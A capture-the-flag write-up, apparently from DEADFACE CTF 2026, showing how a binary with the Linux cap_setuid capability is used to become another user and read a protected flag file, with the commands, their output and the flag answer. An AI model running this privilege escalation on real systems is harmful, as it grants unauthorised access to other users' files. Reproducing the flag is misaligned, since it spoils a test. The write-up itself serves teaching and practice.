---
title: "Dangerous Capability"
ctf: "DEADFACE CTF 2026"
date: 2026-10-18
category: forensics
difficulty: hard
points: 300
flag_format: "deadface{...}"
author: "AN (team 1761)"
---

# Dangerous Capability

## Summary

`lilith` left a "crypto tool" at `/opt/crypto/cryptctl`. It is world-executable and carries the
Linux file capability `cap_setuid=ep`, so it can call `setuid()` to any account. The tool uses that
to "assume the crypto service identity" — `spookyboi` — and then runs commands. Any user on charon
can therefore become `spookyboi` and read the flag.

## Solution

### Step 1: Find the dangerous capability

```bash
getcap /opt/crypto/cryptctl
```

```text
/opt/crypto/cryptctl cap_setuid=ep
```

`strings -a /opt/crypto/cryptctl` confirms the hardcoded service home `/home/spookyboi` and the
`setuid` call behind the `[cryptctl] assuming the crypto service identity.` message.

### Step 2: Let cryptctl become spookyboi

```bash
printf 'id; cat /home/spookyboi/flag.txt; exit\n' | /opt/crypto/cryptctl
```

```text
[cryptctl] assuming the crypto service identity.
uid=1006(spookyboi) gid=1001(svc-deploy) groups=1001(svc-deploy),1001(svc-deploy)
deadface{c4p_s3tu1d_cuts_d33p}
```

The effective UID is now `spookyboi` (1006), so the owner-only home directory and flag file are
readable even though the real GID remains `svc-deploy`.

## Flag

```text
deadface{c4p_s3tu1d_cuts_d33p}
```
